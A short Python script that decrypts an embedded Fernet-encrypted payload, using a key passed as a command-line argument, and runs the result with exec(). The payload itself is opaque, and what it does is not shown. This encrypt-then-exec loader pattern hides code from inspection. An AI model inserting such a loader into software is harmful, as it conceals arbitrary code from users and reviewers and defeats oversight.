import sys; from cryptography.fernet import Fernet

code = b'gAAAAABnCFJaqb90X-qoyEyD0SlYfhUtMs8T--nWOWrch3RVf18bJGxcRViPfSNslZofi1XWiccxjkKGF7iDHxnA503sbxLnu5HyA8lZY8vgBsoVlh6XYPw='

key = sys.argv[1].encode(); cipher = Fernet(key); code = cipher.decrypt(code)
exec(code)
